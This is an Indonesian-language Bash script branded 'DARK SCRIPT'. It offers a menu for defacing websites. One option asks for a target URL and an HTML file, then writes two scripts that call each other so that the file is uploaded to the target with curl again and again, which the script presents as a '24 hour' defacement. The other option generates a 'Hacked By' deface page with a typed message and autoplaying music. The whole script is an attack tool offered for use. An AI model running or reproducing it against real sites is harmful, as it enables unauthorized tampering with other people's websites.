clear
echo -e '''
\e[0;35m██████╗  █████╗ ██████╗ ██╗  ██╗    ███████╗ ██████╗██████╗ ██╗██████╗ ████████╗
\e[1;36m██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝
\e[0;35m██║  ██║███████║██████╔╝█████╔╝     ███████╗██║     ██████╔╝██║██████╔╝   ██║   
\e[1;36m██║  ██║██╔══██║██╔══██╗██╔═██╗     ╚════██║██║     ██╔══██╗██║██╔═══╝    ██║   
\e[0;35m██████╔╝██║  ██║██║  ██║██║  ██╗    ███████║╚██████╗██║  ██║██║██║        ██║   
\e[1;36m╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   
'''

echo ''
echo ''
echo ''
echo -e '\e[0;32m[\e[0;31m#\e[0;32m]\e[1;37m===============================\e[0;32m[\e[0;31m!\e[0;32m]'
echo -e '\e[1;33m[\e[1;32m*\e[1;33m][\e[0;31m1\e[1;33m]\e[0;36mDEFACE 24 JAM               \e[1;33m[\e[1;32m*\e[1;33m]'
echo -e '\e[1;33m[\e[1;32m*\e[1;33m][\e[0;31m2\e[1;33m]\e[0;36mBUAT SCRIPT HTML            \e[1;33m[\e[1;32m*\e[1;33m]'
echo -e '\e[1;33m[\e[1;32m*\e[1;33m][\e[0;31mx\e[1;33m]\e[0;36mKELUAR                      \e[1;33m[\e[1;32m*\e[1;33m]'
echo -e '\e[0;32m[\e[0;31m#\e[0;32m]\e[1;37m===============================\e[0;32m[\e[0;31m!\e[0;32m]'
echo ''
echo ''
echo ''
read -p 'root@DARK_SEC ~# ' jj

if [ "$jj" = "1" ]; then
    read -p $'\e[32mWebsite Yang Mau Di Deface ~>\e[0m ' target
    echo -e 'NOTE: JIKA FILE DI DALAM FOLDER LAIN HARUS MENGGUNAKAN /$HOME/direktory/nama file.html'
    read -p $'\e[32mscript html ~> ' file

    # Hapus dan buat skrip login.sh
    rm -f login.sh
    cat <<Head > login.sh
curl -T "$file" "$target"
sh conf.sh
Head

    # Hapus dan buat skrip conf.sh
    rm -f conf.sh
    cat <<conf > conf.sh
bash login.sh
conf

    echo '24 jam tebas dimulai!'
    echo 'Situs deface Anda tidak akan di-deface sama orang lain!'
    echo 'Anda boleh tidur!'
    echo 'Jangan keluar dari script ini jika Anda tidak mau situs ini di-deface sama orang lain!'
    
    # Jalankan login.sh
    bash login.sh
elif [ "$jj" = "2" ]; then
    read -p $'\e[32mNama Anda :\e[0m ' user3
    read -p $'\e[32mpesan pertama  :\e[0m ' pesanf
    read -p $'\e[32mpesan kedua  :\e[0m ' pesang
    read -p $'\e[32mpesan ketiga  :\e[0m ' pesanh
    read -p $'\e[32mpesan keempat  :\e[0m ' pesanj

    # Hapus dan buat file index.html
    rm -f index.html
    cat <<ha > index.html
<html>
<head>
<title>Hacked By $user3</title>
<style>
body {
    background: url(https://vignette.wikia.nocookie.net/steven-universe/images/a/a6/Space_like.gif/revision/latest?cb=20170413133510) no-repeat center center fixed;
    -webkit-background-size: cover;
    -moz-background-size: cover;
    -o-background-size: cover;
    background-size: cover;
}
h1 {
    color: #00e2bd;
    text-align: center;
    font: 46px fantasy;
    text-shadow: 0px 0px 60px #d10000;
}
</style>
</head>
<body>
<h1>Hacked by $user3</h1><hr size="10px" width="98%" height="6px" color="#0090bc" position="top" top="4px">
<center>
<img src="http://3.bp.blogspot.com/-dCijSi1fl4s/Vc6jF5hFEOI/AAAAAAAABGE/4Q4tDf4ZgUE/s1600/Garuda%2BPancasila.png" height="300" width="270" />
</center>
<br>
<div style="text-align: center;">
<script language="JavaScript">
var text = "( pesan untuk anda )<br>$pesanf<br>$pesang<br>$pesanh<br>$pesanj<br>SCRIPT BY MR_DARK :)";
var delay = 90;
var currentChar = 0;
var destination = "textDestination"; // Mengganti 'none' dengan ID yang sesuai
function type() {
    var dest = document.getElementById(destination);
    if (dest) {
        dest.innerHTML = text.substr(0, currentChar) + "<blink>_</blink>";
        currentChar++;
        if (currentChar > text.length) {
            currentChar = 1;
            setTimeout(type, 5000);
        } else {
            setTimeout(type, delay);
        }
    }
}
function startTyping(textParam, delayParam, destinationParam) {
    text = textParam;
    delay = delayParam;
    currentChar = 0; // Mengubah ini untuk memulai dari karakter pertama
    destination = destinationParam;
    type();
}
startTyping(text, delay, destination);
</script>
<b><font face="courier new"><div id="textDestination" style="background-color: ; color:#00e2bd; font: 50px arial; margin: 0px;"></div></font></b>
<hr size="10px" width="100%" height="6px" color="#0090bc" style="position: fixed; width: 98%; bottom: 0px;">
<audio src="https://i.top4top.io/m_16036g6f61.mp3" autoplay="true" loop="true"></audio>
<center>
<audio autoplay="autoplay" controls="controls" src="https://i.top4top.io/m_16036g6f61.mp3" type="audio/mpeg"></audio>
</center>
</body>
</html>
ha

    read -p 'Sekalian deface bang? (y/t): ' y
    if [ "$y" = "y" ]; then
        bash dark_script.sh
    elif [ "$y" = "t" ]; then
        echo 'byee'
        exit
    fi
elif [ "$jj" = "x" ] || [ "$jj" = "X" ]; then
    echo 'byeeeee'
    exit
fi
